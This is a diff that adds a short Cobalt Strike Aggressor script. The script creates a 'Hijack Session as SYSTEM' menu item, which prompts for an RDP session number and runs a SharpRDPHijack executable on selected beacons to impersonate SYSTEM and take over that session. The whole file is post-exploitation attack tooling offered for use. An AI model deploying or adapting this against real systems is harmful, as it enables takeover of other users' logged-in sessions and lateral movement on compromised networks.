@@ -1,0 +1,16 @@
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and Hijack Session
+item "Hijack Session as SYSTEM"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpsys($bid);
+		}
+}
+
+
+
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and Hijack Session
+sub rdpsys{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1");
+}, $bids => $1)); 
+}
